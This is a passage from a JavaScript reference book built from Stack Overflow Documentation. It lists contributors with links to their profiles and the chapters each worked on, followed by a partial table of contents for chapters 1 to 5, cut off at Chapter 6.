  [Hardik Kanjariya                                            Chapters 12, 14, 46 and 47
  ツ](https://stackoverflow.com/users/4423221/)                

  [harish gadiya](https://stackoverflow.com/users/3979073/)    Chapter 104

  [haykam](https://stackoverflow.com/users/5513988/)           Chapters 1, 5, 7 and 101

  [Hayko Koryun](https://stackoverflow.com/users/771466/)      Chapter 14

  [HC&lowbar;](https://stackoverflow.com/users/2762310/)             Chapter 64

  [HDT](https://stackoverflow.com/users/2560137/)              Chapter 43

  [Hendry](https://stackoverflow.com/users/1728166/)           Chapter 91

  [Henrique                                                    Chapters 42 and 56
  Barcelos](https://stackoverflow.com/users/1798341/)          

  [Hi I&apos;m Frogatto](https://stackoverflow.com/users/1841194/) Chapter 7

  [hiby](https://stackoverflow.com/users/5709868/)             Chapter 33

  [hindmost](https://stackoverflow.com/users/2118955/)         Chapters 14 and 29

  [hirnwunde](https://stackoverflow.com/users/5690568/)        Chapter 5

  [hirse](https://stackoverflow.com/users/1469028/)            Chapter 36

  [HopeNick](https://stackoverflow.com/users/1349893/)         Chapters 15 and 85
  

  
  [Hunan                                                    Chapter 12
  Rostomyan](https://stackoverflow.com/users/2672370/)      
  - 
  [I am always                                              Chapter 83
  right](https://stackoverflow.com/users/4038917/)          

  [Iain Ballard](https://stackoverflow.com/users/423033/)   Chapter 50

  [Ian](https://stackoverflow.com/users/21061/)             Chapters 10, 19 and 35

  [iBelieve](https://stackoverflow.com/users/1917313/)      Chapters 55 and 57

  [Igor Raush](https://stackoverflow.com/users/1391671/)    Chapters 10, 41, 42, 57 and 62

  [Inanc Gumus](https://stackoverflow.com/users/115363/)    Chapters 1, 5 and 81

  [inetphantom](https://stackoverflow.com/users/2828611/)   Chapter 1

  [Ishmael                                                  Chapter 12
  Smyrnow](https://stackoverflow.com/users/192217/)         

  [Isti115](https://stackoverflow.com/users/1831096/)       Chapter 12

  [iulian](https://stackoverflow.com/users/3120525/)        Chapter 15

  [Ivan](https://stackoverflow.com/users/6331369/)          Chapter 36

  [ivarni](https://stackoverflow.com/users/957731/)         Chapter 22

  [J F](https://stackoverflow.com/users/5244995/)           Chapters 14, 58, 59, 89 and 90

  [jabacchetta](https://stackoverflow.com/users/4500152/)   Chapter 62

  [James                                                    Chapter 32
  Donnelly](https://stackoverflow.com/users/1317805/)       

  [James Long](https://stackoverflow.com/users/557019/)     Chapter 12

  [Jamie](https://stackoverflow.com/users/3222831/)         Chapter 10

  [Jan Pokorný](https://stackoverflow.com/users/6099426/)   Chapter 13

  [Jason Park](https://stackoverflow.com/users/4548134/)    Chapter 12

  [Jay](https://stackoverflow.com/users/3082194/)           Chapters 19 and 22

  [JBCP](https://stackoverflow.com/users/1017787/)          Chapters 3 and 42

  [jbmartinez](https://stackoverflow.com/users/3397274/)    Chapter 19

  [jchavannes](https://stackoverflow.com/users/744298/)     Chapter 30

  [jchitel](https://stackoverflow.com/users/1234443/)       Chapter 42

  [JCOC611](https://stackoverflow.com/users/532978/)        Chapter 40

  [JDB](https://stackoverflow.com/users/211627/)            Chapter 19

  [Jean Lourenço](https://stackoverflow.com/users/1964479/) Chapter 19

  [Jef](https://stackoverflow.com/users/4142458/)           Chapter 106

  [Jeremy Banks](https://stackoverflow.com/users/1114/)     Chapters 1, 10, 12, 13, 14, 19, 22, 27, 33, 35, 36,
                                                            50, 51, 53, 54, 55, 62, 71, 94 and 97

  [Jeremy J                                                 Chapter 12
  Starcher](https://stackoverflow.com/users/807787/)        

  [Jeroen](https://stackoverflow.com/users/419956/)         Chapters 1 and 11

  [JimmyLv](https://stackoverflow.com/users/5871340/)       Chapter 81

  [Jinw](https://stackoverflow.com/users/4794828/)          Chapter 79

  [jisoo](https://stackoverflow.com/users/6377969/)         Chapter 12

  [jitendra                                                 Chapter 1
  varshney](https://stackoverflow.com/users/6402939/)       

  [Jivings](https://stackoverflow.com/users/334274/)        Chapters 10, 35, 50 and 55

  [jkdev](https://stackoverflow.com/users/3345375/)         Chapters 3, 10, 12, 18, 30, 35, 36, 39 and 56

  [JKillian](https://stackoverflow.com/users/3124288/)      Chapter 31

  [jmattheis](https://stackoverflow.com/users/4244993/)     Chapter 1

  [John](https://stackoverflow.com/users/6310232/)          Chapter 13

  [John Archer](https://stackoverflow.com/users/887930/)    Chapter 99

  [John C](https://stackoverflow.com/users/1173776/)        Chapter 8

  [John                                                     Chapter 28
  Oksasoglu](https://stackoverflow.com/users/6713446/)      

  [John Slegers](https://stackoverflow.com/users/1946501/)  Chapters 1, 8, 12, 35, 42, 53 and 62

  [John Syrinek](https://stackoverflow.com/users/400550/)   Chapters 29 and 68

  [Jonas W.](https://stackoverflow.com/users/5260024/)      Chapter 13

  [Jonathan Lam](https://stackoverflow.com/users/2397327/)  Chapters 1, 7, 29 and 45

  [Jonathan                                                 Chapters 18, 27 and 31
  Walters](https://stackoverflow.com/users/4838658/)        

  [Joseph](https://stackoverflow.com/users/575527/)         Chapters 19 and 42

  [Joshua                                                   Chapters 1 and 25
  Kleveter](https://stackoverflow.com/users/4581977/)       

  [Junbang Huang](https://stackoverflow.com/users/3077801/) Chapter 76
  

  -
  [Just a student](https://stackoverflow.com/users/962603/) Chapters 5 and 74
  - 
  [K48](https://stackoverflow.com/users/6269864/)           Chapters 1, 9, 10, 33, 42 and 99

  [kamoroso94](https://stackoverflow.com/users/2727710/)    Chapters 8, 14, 19 and 64

  [kanaka](https://stackoverflow.com/users/471795/)         Chapter 61

  [kapantzak](https://stackoverflow.com/users/1221792/)     Chapters 20 and 62

  [Karuppiah](https://stackoverflow.com/users/4772008/)     Chapter 1

  [Kayce Basques](https://stackoverflow.com/users/1669860/) Chapter 63

  [Keith](https://stackoverflow.com/users/905/)             Chapters 81 and 82

  [Kemi](https://stackoverflow.com/users/5168448/)          Chapter 69

  [kevguy](https://stackoverflow.com/users/5836921/)        Chapters 62 and 63

  [Kevin Katzke](https://stackoverflow.com/users/1280289/)  Chapter 10

  [Kevin Law](https://stackoverflow.com/users/585371/)      Chapter 19

  [khawarPK](https://stackoverflow.com/users/1465579/)      Chapter 10

  [Kit Grose](https://stackoverflow.com/users/181495/)      Chapter 54

  [Knu](https://stackoverflow.com/users/248058/)            Chapters 10, 11, 13, 14, 18, 35, 36, 97 and 99

  [Kousha](https://stackoverflow.com/users/834045/)         Chapter 10

  [Kyle Blake](https://stackoverflow.com/users/4597392/)    Chapters 10 and 12

  [L Bahr](https://stackoverflow.com/users/6194193/)        Chapters 10, 37, 66 and 102

  [leo.fcx](https://stackoverflow.com/users/3417449/)       Chapter 42

  [Li357](https://stackoverflow.com/users/5647260/)         Chapter 106

  [Liam](https://stackoverflow.com/users/542251/)           Chapter 17

  [Lisa Gagarina](https://stackoverflow.com/users/4255426/) Chapter 65

  [LiShuaiyuan](https://stackoverflow.com/users/7165616/)   Chapter 35

  [Little Child](https://stackoverflow.com/users/1894684/)  Chapter 41

  [little pootis](https://stackoverflow.com/users/1947276/) Chapter 1

  [Louis                                                    Chapters 13, 35 and 65
  Barranqueiro](https://stackoverflow.com/users/3755845/)   

  [Luís Hendrix](https://stackoverflow.com/users/5174914/)  Chapters 10, 60 and 104

  [Luc125](https://stackoverflow.com/users/746757/)         Chapters 7 and 12

  [luisfarzati](https://stackoverflow.com/users/1206952/)   Chapter 42

  [M. Erraysy](https://stackoverflow.com/users/5524646/)    Chapter 12

  [Maciej Gurban](https://stackoverflow.com/users/2066118/) Chapters 12 and 65

  [Madara Uchiha](https://stackoverflow.com/users/871050/)  Chapters 19, 20, 59, 60, 81 and 82

  [maheeka](https://stackoverflow.com/users/1403246/)       Chapter 9

  [maioman](https://stackoverflow.com/users/2417031/)       Chapters 19 and 42

  [Marco Bonelli](https://stackoverflow.com/users/3889449/) Chapters 3, 53 and 96

  [Marco                                                    Chapters 3, 10, 13, 17, 20, 27, 30, 42, 46, 56,
  Scabbiolo](https://stackoverflow.com/users/2002588/)      57, 68, 69, 81 and 90

  [Marina K.](https://stackoverflow.com/users/5311928/)     Chapters 10 and 104

  [mark](https://stackoverflow.com/users/2682218/)          Chapters 19 and 56

  [Mark                                                     Chapters 5 and 99
  Schultheiss](https://stackoverflow.com/users/125981/)     

  [mash](https://stackoverflow.com/users/6572285/)          Chapter 10

  [MasterBob](https://stackoverflow.com/users/5535493/)     Chapters 1, 19, 24, 25 and 81

  [Matas                                                    Chapters 1, 6 and 42
  Vaitkevicius](https://stackoverflow.com/users/1509764/)   

  [Mathias Bynens](https://stackoverflow.com/users/96656/)  Chapter 1

  [Matt Lishman](https://stackoverflow.com/users/3379536/)  Chapter 57

  [Matt S](https://stackoverflow.com/users/163024/)         Chapter 31

  [Mattew Whitt](https://stackoverflow.com/users/3264217/)  Chapter 42

  [Matthew Crumley](https://stackoverflow.com/users/2214/)  Chapters 18, 67, 84 and 104

  [mauris](https://stackoverflow.com/users/126039/)         Chapters 33 and 56

  [Max Alcala](https://stackoverflow.com/users/2785476/)    Chapters 12, 19, 41 and 56

  [Maximillian                                              Chapter 42
  Laumeister](https://stackoverflow.com/users/2234742/)     

  [Md. Mahbubul                                             Chapter 13
  Haque](https://stackoverflow.com/users/1878457/)          

  [MEGADEVOPS](https://stackoverflow.com/users/4786134/)    Chapter 1

  [MegaTom](https://stackoverflow.com/users/3990897/)       Chapter 11
  -

  
  [Meow](https://stackoverflow.com/users/5050271/)             Chapters 7, 11, 14, 19, 59 and 62
   
  [metal03326](https://stackoverflow.com/users/4471582/)       Chapters 92 and 99

  [Michal                                                      Chapter 17
  Pietraszko](https://stackoverflow.com/users/6599814/)        

  [Michał                                                      Chapters 1, 35, 38, 43, 76, 77 and 81
  Perłakowski](https://stackoverflow.com/users/3853934/)       

  [Michiel](https://stackoverflow.com/users/2245950/)          Chapter 12

  [Mijago](https://stackoverflow.com/users/3909575/)           Chapter 97

  [Mike C](https://stackoverflow.com/users/371184/)            Chapters 10, 11, 12, 13, 18, 19, 37, 57 and
                                                               65

  [Mike McCaughan](https://stackoverflow.com/users/215552/)    Chapters 3, 8, 9, 12, 13, 15 and 42

  [Mikhail](https://stackoverflow.com/users/5526354/)          Chapters 5, 7, 12, 14, 33, 39, 45, 55 and
                                                               58

  [Mikki](https://stackoverflow.com/users/4236520/)            Chapter 97

  [Mimouni](https://stackoverflow.com/users/2822643/)          Chapters 1 and 12

  [miquelarranz](https://stackoverflow.com/users/2280356/)     Chapter 89

  [Mobiletainment](https://stackoverflow.com/users/1265240/)   Chapter 89

  [Mohamed El](https://stackoverflow.com/users/4517814/)       Chapter 55

  [monikapatel](https://stackoverflow.com/users/4426282/)      Chapter 5

  [Morteza Tourani](https://stackoverflow.com/users/3078890/)  Chapter 12

  [Motocarota](https://stackoverflow.com/users/593963/)        Chapter 42

  [Mottie](https://stackoverflow.com/users/145346/)            Chapters 10, 12, 14 and 18

  [murrayju](https://stackoverflow.com/users/866224/)          Chapter 81

  [n4m31ess_c0d3r](https://stackoverflow.com/users/1726659/)   Chapter 10

  [Nachiketha](https://stackoverflow.com/users/1657018/)       Chapter 63

  [Naeem Shaikh](https://stackoverflow.com/users/3556874/)     Chapters 42 and 69

  [nalply](https://stackoverflow.com/users/220060/)            Chapters 10 and 42

  [Naman Sancheti](https://stackoverflow.com/users/3709792/)   Chapters 1 and 50

  [nasoj1100](https://stackoverflow.com/users/4842671/)        Chapter 12

  [Nathan Tuggy](https://stackoverflow.com/users/4099598/)     Chapter 7

  [naveen](https://stackoverflow.com/users/17447/)             Chapter 65

  [ndugger](https://stackoverflow.com/users/1408759/)          Chapters 17, 19, 22 and 62

  [Neal](https://stackoverflow.com/users/561731/)              Chapters 12, 13, 19, 22, 27, 36 and 62

  [Nelson Teixeira](https://stackoverflow.com/users/2752520/)  Chapter 12

  [nem035](https://stackoverflow.com/users/3928341/)           Chapters 10, 12, 20, 60 and 65

  [nhahtdh](https://stackoverflow.com/users/1400768/)          Chapter 31

  [Nhan](https://stackoverflow.com/users/2571493/)             Chapters 12 and 35

  [ni8mr](https://stackoverflow.com/users/3458727/)            Chapters 10 and 18

  [nicael](https://stackoverflow.com/users/2963652/)           Chapters 11, 42, 44 and 99

  [Nicholas Montaño](https://stackoverflow.com/users/4883095/) Chapter 102

  [Nick](https://stackoverflow.com/users/2639721/)             Chapter 1

  [Nick Larsen](https://stackoverflow.com/users/178082/)       Chapter 61

  [NickHTTPS](https://stackoverflow.com/users/1167472/)        Chapter 63

  [Nikita Kurtin](https://stackoverflow.com/users/3219049/)    Chapters 99 and 104

  [Nikola Lukic](https://stackoverflow.com/users/1513187/)     Chapters 58 and 101

  [Nina Scholz](https://stackoverflow.com/users/1447675/)      Chapters 12 and 40

  [Nisarg](https://stackoverflow.com/users/5894241/)           Chapter 66

  [npdoty](https://stackoverflow.com/users/108575/)            Chapter 71

  [nseepana](https://stackoverflow.com/users/6709129/)         Chapter 104

  [Nuri Tasdemir](https://stackoverflow.com/users/1519458/)    Chapters 42 and 62

  [nus](https://stackoverflow.com/users/1115652/)              Chapter 19

  [nylki](https://stackoverflow.com/users/2921415/)            Chapter 1

  [Oriol](https://stackoverflow.com/users/1529630/)            Chapter 10

  [Ortomala Lokni](https://stackoverflow.com/users/1807667/)   Chapter 10

  [orvi](https://stackoverflow.com/users/3654356/)             Chapters 1 and 18

  [Oscar Jara](https://stackoverflow.com/users/1178686/)       Chapter 10

  [Ovidiu Dolha](https://stackoverflow.com/users/5379496/)     Chapter 93
  

[Ozan](https://stackoverflow.com/users/4180481/) Chapter 75

[oztune](https://stackoverflow.com/users/906311/) Chapters 5, 18, 55 and
57

[P.J.Meisch](https://stackoverflow.com/users/4393565/) Chapter 62
[PageYe](https://stackoverflow.com/users/6488128/) Chapter 10
>
[Pankaj Upadhyay](https://stackoverflow.com/users/405630/) Chapter 62
[Parvez Rahaman](https://stackoverflow.com/users/3324481/) Chapters 30
and 72

[patrick96](https://stackoverflow.com/users/5363071/) Chapter 42

[Paul S.](https://stackoverflow.com/users/1615483/) Chapters 7, 10, 19,
27, 31 and 62

[Pawel Dubiel](https://stackoverflow.com/users/706466/) Chapters 17
and 59 [PedroSouki](https://stackoverflow.com/users/4166211/) Chapters
23 and 65

[pensan](https://stackoverflow.com/users/1162597/) Chapter 14

[Peter Bielak](https://stackoverflow.com/users/2051835/) Chapter 94

[Peter G](https://stackoverflow.com/users/4504895/) Chapter 5

[Peter LaBanca](https://stackoverflow.com/users/7513380/) Chapter 1

[Peter Olson](https://stackoverflow.com/users/546661/) Chapter 13
[Peter Seliger](https://stackoverflow.com/users/2627243/) Chapter 22
[phaistonian](https://stackoverflow.com/users/422839/) Chapter 12
>
[Phil](https://stackoverflow.com/users/6429774/) Chapter 13
[pietrovismara](https://stackoverflow.com/users/3142367/) Chapter 89
[Pinal](https://stackoverflow.com/users/2525067/) Chapters 19, 42 and
55 [pinjasaur](https://stackoverflow.com/users/6357231/) Chapter 4
[PitaJ](https://stackoverflow.com/users/847382/) Chapter 65
>
[Pranav C Balan](https://stackoverflow.com/users/3037257/) Chapter 12
[programmer5000](https://stackoverflow.com/users/6560716/) Chapter 95
[ProllyGeek](https://stackoverflow.com/users/3025259/) Chapters 20, 65
and 79 [pzp](https://stackoverflow.com/users/3155933/) Chapters 8, 30
and 71

[Qianyue](https://stackoverflow.com/users/1165178/) Chapters 12, 60 and
62

[QoP](https://stackoverflow.com/users/4484822/) Chapters 12, 19, 22, 35,
42 and 57

[Quartz Fog](https://stackoverflow.com/users/6513795/) Chapters 31 and
54

[Quill](https://stackoverflow.com/users/3296811/) Chapters 7 and 42

[Racil Hilan](https://stackoverflow.com/users/3215948/) Chapter 34
[Rafael Dantas](https://stackoverflow.com/users/3504913/) Chapter 12

[Rahul Arora](https://stackoverflow.com/users/5433342/) Chapters 20 and
29

[Rajaprabhu Aravindasamy](https://stackoverflow.com/users/1209018/)
Chapter 13

[Rajesh](https://stackoverflow.com/users/3783478/) Chapter 10

[Rakitić](https://stackoverflow.com/users/6290553/) Chapter 1

[RamenChef](https://stackoverflow.com/users/6392939/) Chapter 14

[Randy](https://stackoverflow.com/users/1691311/) Chapters 19 and 50

[Raphael Schweikert](https://stackoverflow.com/users/11940/) Chapter
10 [rfsbsb](https://stackoverflow.com/users/1949694/) Chapter 67
[richard](https://stackoverflow.com/users/2958281/) Chapter 37

[Richard Hamilton](https://stackoverflow.com/users/4703663/) Chapters 7,
10, 12, 14, 31, 48 and 99

[Richard Turner](https://stackoverflow.com/users/12559/) Chapter 62
[riyaz](https://stackoverflow.com/users/6611700/) Chapter 42
[Roamer](https://stackoverflow.com/users/3478010/) Chapter 42

[Rohit Jindal](https://stackoverflow.com/users/4116300/) Chapters 30 and
40

[Rohit Kumar](https://stackoverflow.com/users/6076713/) Chapter 57

[Rohit Shelhalkar](https://stackoverflow.com/users/4396403/) Chapter 5

[Roko C. Buljan](https://stackoverflow.com/users/383904/) Chapters 4, 7,
12, 14, 33, 44, 45, 89 and 106

[rolando](https://stackoverflow.com/users/3384695/) Chapters 12, 13, 18
and 19

[rolfedh](https://stackoverflow.com/users/3005258/) Chapter 19

[Ronen Ness](https://stackoverflow.com/users/1134649/) Chapters 12, 19,
32 and 43

[ronnyfm](https://stackoverflow.com/users/204968/) Chapter 1

  
  [royhowie](https://stackoverflow.com/users/2476755/)           Chapter 35
   
  [Ruhul Amin](https://stackoverflow.com/users/1960558/)         Chapter 41

  [rvighne](https://stackoverflow.com/users/1079573/)            Chapters 13, 19, 22, 45 and 88

  [Ry](https://stackoverflow.com/users/707111/)                  Chapter 31

  [S Willis](https://stackoverflow.com/users/5795554/)           Chapter 8

  [sabithpocker](https://stackoverflow.com/users/427146/)        Chapter 7

  [Sagar V](https://stackoverflow.com/users/2427065/)            Chapters 19, 29 and 61

  [Sammy I.](https://stackoverflow.com/users/3413536/)           Chapter 20

  [Sandro](https://stackoverflow.com/users/107797/)              Chapter 12

  [SarathChandra](https://stackoverflow.com/users/2869791/)      Chapter 11

  [Saroj Sasmal](https://stackoverflow.com/users/5293076/)       Chapter 1

  [Scimonster](https://stackoverflow.com/users/3187556/)         Chapter 24

  [Sean Vieira](https://stackoverflow.com/users/135978/)         Chapter 27

  [SeanKendle](https://stackoverflow.com/users/1410567/)         Chapter 1

  [SeinopSys](https://stackoverflow.com/users/1344955/)          Chapters 1 and 96

  [SEUH](https://stackoverflow.com/users/2517393/)               Chapter 61

  [SgtPooki](https://stackoverflow.com/users/592760/)            Chapter 97

  [shaedrich](https://stackoverflow.com/users/7451109/)          Chapter 70

  [shaN](https://stackoverflow.com/users/4221558/)               Chapter 90

  [Shawn](https://stackoverflow.com/users/430213/)               Chapter 60

  [Shog9](https://stackoverflow.com/users/811/)                  Chapters 19 and 59

  [Shrey Gupta](https://stackoverflow.com/users/1543403/)        Chapter 12

  [Sibeesh Venu](https://stackoverflow.com/users/5550507/)       Chapter 56

  [sielakos](https://stackoverflow.com/users/6356166/)           Chapters 12, 19 and 50

  [Siguza](https://stackoverflow.com/users/2302862/)             Chapter 40

  [simonv](https://stackoverflow.com/users/6546775/)             Chapter 29

  [SirPython](https://stackoverflow.com/users/3424096/)          Chapter 5

  [smallmushroom](https://stackoverflow.com/users/7166588/)      Chapter 18

  [Spencer Wieczorek](https://stackoverflow.com/users/3149020/)  Chapters 7, 10, 15 and 65

  [spirit](https://stackoverflow.com/users/6245875/)             Chapter 35

  [splay](https://stackoverflow.com/users/1392998/)              Chapters 7, 10 and 40

  [Sreekanth](https://stackoverflow.com/users/6794233/)          Chapter 89

  [ssc](https://stackoverflow.com/users/3233827/)                Chapter 1

  [stackoverfloweth](https://stackoverflow.com/users/3511012/)   Chapter 13

  [Stephen Leppik](https://stackoverflow.com/users/6388243/)     Chapter 40

  [Steve Greatrex](https://stackoverflow.com/users/261782/)      Chapter 42

  [Stewartside](https://stackoverflow.com/users/2889988/)        Chapter 14

  [Stides](https://stackoverflow.com/users/3940327/)             Chapter 60

  [still_learning](https://stackoverflow.com/users/2948765/)     Chapters 14 and 94

  [styfle](https://stackoverflow.com/users/266535/)              Chapter 20

  [sudo bangbang](https://stackoverflow.com/users/3951782/)      Chapter 42

  [Sumit](https://stackoverflow.com/users/2741678/)              Chapter 11

  [Sumner Evans](https://stackoverflow.com/users/2319844/)       Chapters 99 and 102

  [Sumurai8](https://stackoverflow.com/users/2209007/)           Chapters 8, 10, 13, 14, 17, 35 and 56

  [Sunny R Gupta](https://stackoverflow.com/users/1477051/)      Chapter 56

  [svarog](https://stackoverflow.com/users/1410465/)             Chapters 7, 17, 43, 80 and 90

  [Sverri M. Olsen](https://stackoverflow.com/users/1300892/)    Chapter 1

  [SZenC](https://stackoverflow.com/users/3315779/)              Chapters 1, 10, 11, 13, 14, 18, 19, 30, 31, 32,
                                                                 36, 59, 62, 80 and 97

  [Tacticus](https://stackoverflow.com/users/3362188/)           Chapter 96

  [tandrewnichols](https://stackoverflow.com/users/1437845/)     Chapter 19

  [Tanmay Nehete](https://stackoverflow.com/users/2608080/)      Chapter 19

  [Taras Lukavyi](https://stackoverflow.com/users/900982/)       Chapter 59

  [tcooc](https://stackoverflow.com/users/368772/)               Chapter 42
  

  -
  [teppic](https://stackoverflow.com/users/3591528/)              Chapter 42
   
  [Thomas Leduc](https://stackoverflow.com/users/1204267/)        Chapter 31

  [Thriggle](https://stackoverflow.com/users/2701677/)            Chapters 1 and 19

  [Ties](https://stackoverflow.com/users/5171528/)                Chapter 74

  [tiffon](https://stackoverflow.com/users/1888292/)              Chapter 101

  [Tim](https://stackoverflow.com/users/4714902/)                 Chapter 30

  [Tim Rijavec](https://stackoverflow.com/users/2365792/)         Chapter 86

  [Tiny Giant](https://stackoverflow.com/users/4639281/)          Chapter 36

  [tjfwalker](https://stackoverflow.com/users/2180523/)           Chapter 11

  [tnga](https://stackoverflow.com/users/5221347/)                Chapter 1

  [Tolen](https://stackoverflow.com/users/5593085/)               Chapter 1

  [Tomás Cañibano](https://stackoverflow.com/users/5384592/)      Chapters 7 and 59

  [Tomboyo](https://stackoverflow.com/users/4816074/)             Chapter 17

  [tomturton](https://stackoverflow.com/users/1485351/)           Chapter 65

  [ton](https://stackoverflow.com/users/2397613/)                 Chapter 56

  [Tot Zam](https://stackoverflow.com/users/4660897/)             Chapter 36

  [towerofnix](https://stackoverflow.com/users/4633828/)          Chapter 38

  [transistor09](https://stackoverflow.com/users/420597/)         Chapter 33

  [Traveling Tech Guy](https://stackoverflow.com/users/19856/)    Chapter 12

  [Travis Acton](https://stackoverflow.com/users/7675833/)        Chapter 1

  [Trevor Clarke](https://stackoverflow.com/users/3998484/)       Chapters 8, 14 and 46

  [trincot](https://stackoverflow.com/users/5459839/)             Chapters 19 and 35

  [Tschallacka](https://stackoverflow.com/users/1356107/)         Chapter 65

  [Tushar](https://stackoverflow.com/users/2025923/)              Chapters 1 and 31

  [user2314737](https://stackoverflow.com/users/2314737/)         Chapters 8, 12, 14, 19, 35, 50, 59 and 104

  [user3882768](https://stackoverflow.com/users/3882768/)         Chapter 11

  [Vaclav](https://stackoverflow.com/users/2508019/)              Chapter 12

  [VahagnNikoghosian](https://stackoverflow.com/users/1696972/)   Chapters 12 and 104

  [Vasiliy Levykin](https://stackoverflow.com/users/2582880/)     Chapters 3, 10 and 19

  [Ven](https://stackoverflow.com/users/1737909/)                 Chapters 1, 10 and 42

  [Victor Bjelkholm](https://stackoverflow.com/users/360186/)     Chapter 5

  [VisioN](https://stackoverflow.com/users/1249581/)              Chapters 12 and 52

  [Vlad Nicula](https://stackoverflow.com/users/665791/)          Chapter 62

  [Vladimir Gabrielyan](https://stackoverflow.com/users/4983595/) Chapter 42

  [wackozacko](https://stackoverflow.com/users/934420/)           Chapters 42 and 60

  [WebBrother](https://stackoverflow.com/users/2179748/)          Chapter 65

  [whales](https://stackoverflow.com/users/5285528/)              Chapters 8 and 18

  [Will](https://stackoverflow.com/users/145279/)                 Chapter 62

  [Wladimir Palant](https://stackoverflow.com/users/785541/)      Chapters 5, 10, 42 and 62

  [Wolfgang](https://stackoverflow.com/users/1979340/)            Chapter 30

  [wuxiandiejia](https://stackoverflow.com/users/4675056/)        Chapters 7, 12 and 43

  [XavCo7](https://stackoverflow.com/users/5522551/)              Chapters 1, 11, 12, 13, 18, 40, 50, 63, 64, 71,
                                                                  90 and 92

  [xims](https://stackoverflow.com/users/1539384/)                Chapter 1

  [YakovL](https://stackoverflow.com/users/3995261/)              Chapter 56

  [ymz](https://stackoverflow.com/users/4062197/)                 Chapter 19

  [Yosvel Quintero](https://stackoverflow.com/users/1932552/)     Chapters 1, 5, 12, 13, 14, 17, 22, 34, 35, 42
                                                                  and 104

  [Yumiko](https://stackoverflow.com/users/4168649/)              Chapter 33

  [Yury Fedorov](https://stackoverflow.com/users/4378400/)        Chapters 1 and 42

  [Zack Harley](https://stackoverflow.com/users/4785610/)         Chapter 56

  [Zaga](https://stackoverflow.com/users/6633643/)                Chapter 31

  [Zaz](https://stackoverflow.com/users/405550/)                  Chapter 42

  [zb&apos;](https://stackoverflow.com/users/815386/)                 Chapter 42

  [zer00ne](https://stackoverflow.com/users/2813224/)             Chapter 12
  -

  -
  [ZeroBased_IX](https://stackoverflow.com/users/1888402/)    Chapter 12
   -
  [Zhegan](https://stackoverflow.com/users/616717/)           Chapter 35

  [zhirzh](https://stackoverflow.com/users/1343488/)          Chapters 12, 14 and 19

  [Zirak](https://stackoverflow.com/users/617762/)            Chapter 56

  [Zoltan.Tamasi](https://stackoverflow.com/users/2081056/)   Chapter 42

  [zur4ik](https://stackoverflow.com/users/516245/)           Chapters 19 and 62

  [zurfyx](https://stackoverflow.com/users/2013580/)          Chapter 70

  [Zze](https://stackoverflow.com/users/3509591/)             Chapter 1
  

# You may also like

<!--last updated 8/22/24 Thu 2:22pm-->
<!--moved table of contents to here-->
[**About** [1](#about)](#about)

[**Chapter 1: Getting started with JavaScript** [2](#section)](#section)

[Section 1.1: Using console.log()
[2](#section-1.1-using-console.log)](#section-1.1-using-console.log)

[Section 1.2: Using the DOM API
[4](#section-1.2-using-the-dom-api)](#section-1.2-using-the-dom-api)

[Section 1.3: Using window.alert()
[5](#section-1.3-using-window.alert)](#section-1.3-using-window.alert)

[Section 1.4: Using window.prompt()
[6](#section-1.4-using-window.prompt)](#section-1.4-using-window.prompt)

[Section 1.5: Using window.confirm()
[7](#section-1.5-using-window.confirm)](#section-1.5-using-window.confirm)

[Section 1.6: Using the DOM API (with graphical text: Canvas, SVG, or
image file)
[8](#section-1.6-using-the-dom-api-with-graphical-text-canvas-svg-or-image-file)](#section-1.6-using-the-dom-api-with-graphical-text-canvas-svg-or-image-file)

[**Chapter 2: JavaScript Variables**
[10](#chapter-2-javascript-variables)](#chapter-2-javascript-variables)

[Section 2.1: Defining a Variable
[10](#section-2.1-defining-a-variable)](#section-2.1-defining-a-variable)

[Section 2.2: Using a Variable
[10](#section-2.2-using-a-variable)](#section-2.2-using-a-variable)

[Section 2.3: Types of Variables
[10](#section-2.3-types-of-variables)](#section-2.3-types-of-variables)

[Section 2.4: Arrays and Objects
[11](#section-2.4-arrays-and-objects)](#section-2.4-arrays-and-objects)

[**Chapter 3: Built-in Constants**
[12](#chapter-3-built-in-constants)](#chapter-3-built-in-constants)

[Section 3.1: null [12](#section-3.1-null)](#section-3.1-null)

[Section 3.2: Testing for NaN using isNaN()
[12](#section-3.2-testing-for-nan-using-isnan)](#section-3.2-testing-for-nan-using-isnan)

[Section 3.3: NaN [13](#section-3.3-nan)](#section-3.3-nan)

[Section 3.4: undefined and null
[14](#section-3.4-undefined-and-null)](#section-3.4-undefined-and-null)

[Section 3.5: Infinity and -Infinity
[15](#section-3.5-infinity-andinfinity)](#section-3.5-infinity-andinfinity)

[Section 3.6: Number constants
[15](#section-3.6-number-constants)](#section-3.6-number-constants)

[Section 3.7: Operations that return NaN
[16](#section-3.7-operations-that-return-nan)](#section-3.7-operations-that-return-nan)

[Section 3.8: Math library functions that return NaN
[16](#section-3.8-math-library-functions-that-return-nan)](#section-3.8-math-library-functions-that-return-nan)

[**Chapter 4: Comments** [17](#chapter-4-comments)](#chapter-4-comments)

[Section 4.1: Using Comments
[17](#section-4.1-using-comments)](#section-4.1-using-comments)

[Section 4.2: Using HTML comments in JavaScript (Bad practice)
[17](#section-4.2-using-html-comments-in-javascript-bad-practice)](#section-4.2-using-html-comments-in-javascript-bad-practice)

[**Chapter 5: Console** [19](#chapter-5-console)](#chapter-5-console)

[Section 5.1: Measuring time - console.time()
[22](#section-5.1-measuring-timeconsole.time)](#section-5.1-measuring-timeconsole.time)

[Section 5.2: Formatting console output
[23](#section-5.2-formatting-console-output)](#section-5.2-formatting-console-output)

[Section 5.3: Printing to a browser&apos;s debugging console
[24](#section-5.3-printing-to-a-browsers-debugging-console)](#section-5.3-printing-to-a-browsers-debugging-console)

[Section 5.4: Including a stack trace when logging - console.trace()
[26](#section-5.4-including-a-stack-trace-when-logging-console.trace)](#section-5.4-including-a-stack-trace-when-logging-console.trace)

[Section 5.5: Tabulating values - console.table()
[26](#section-5.5-tabulating-valuesconsole.table)](#section-5.5-tabulating-valuesconsole.table)

[Section 5.6: Counting - console.count()
[28](#section-5.6-countingconsole.count)](#section-5.6-countingconsole.count)

[Section 5.7: Clearing the console - console.clear()
[30](#section-5.7-clearing-the-consoleconsole.clear)](#section-5.7-clearing-the-consoleconsole.clear)

[Section 5.8: Displaying objects and XML interactively - console.dir(),
console.dirxml()
[30](#section-5.8-displaying-objects-and-xml-interactively-console.dir-console.dirxml)](#section-5.8-displaying-objects-and-xml-interactively-console.dir-console.dirxml)

[Section 5.9: Debugging with assertions - console.assert()
[32](#section-5.9-debugging-with-assertionsconsole.assert)](#section-5.9-debugging-with-assertionsconsole.assert)

[**Chapter 6: Datatypes in JavaScript**
